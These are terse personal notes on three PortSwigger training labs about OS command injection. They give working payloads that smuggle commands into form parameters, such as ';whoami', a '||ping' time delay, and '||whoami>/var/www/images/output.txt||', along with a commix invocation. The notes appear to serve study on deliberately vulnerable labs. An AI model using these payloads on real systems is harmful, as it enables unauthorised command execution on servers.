[Lab: OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
```shell
product?productId=20
Check stock
burp
productId=1&storeId=2 ;whoami
```
[Lab: Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
```shel
#https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#time-based-data-exfiltration
commix:
python3 commix.py -r myfile -p email    #javab nadad
`email=x||ping+-c+10+127.0.0.1||`
```
[Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
```shell
feedback
email
email=||whoami>/var/www/images/output.txt||
open img
img_name ->output.txt
```